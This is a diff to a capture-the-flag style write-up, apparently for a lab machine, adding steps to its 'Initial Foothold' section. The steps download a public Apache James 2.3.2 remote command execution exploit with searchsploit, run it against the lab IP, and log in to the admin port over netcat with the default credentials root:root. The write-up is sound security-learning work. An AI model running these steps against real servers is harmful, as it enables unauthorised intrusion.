@@ -120,10 +120,23 @@ Nmap done: 1 IP address (1 host up) scanned in 270.27 seconds
 
 ## Initial Foothold
   - Apache James Server 2.3.2 - Remote Command Execution using default credentials.
-  - Credentials: `root:root`.
+  - Execute the exploit.
+  - Connect to the target using netcat.
+  - Login using the credentials: `root:root`.
+
+### Download Exploit
 ```CSS
 ▶ searchsploit -m linux/remote/35513.py
 ```
+
+### Run Exploit
 ```CSS
 ▶ python2 35513.py 10.10.10.51
 ```
+![image](https://user-images.githubusercontent.com/83878909/236746610-285d13e2-4f47-4622-a773-d2e1a743ac2f.png)
+
+### Connect to Target
+```CSS
+▶ nc 10.10.10.51 4555
+```
+![image](https://user-images.githubusercontent.com/83878909/236746370-6adb3b95-83e9-4ab4-b182-1f9eae2bd06f.png)
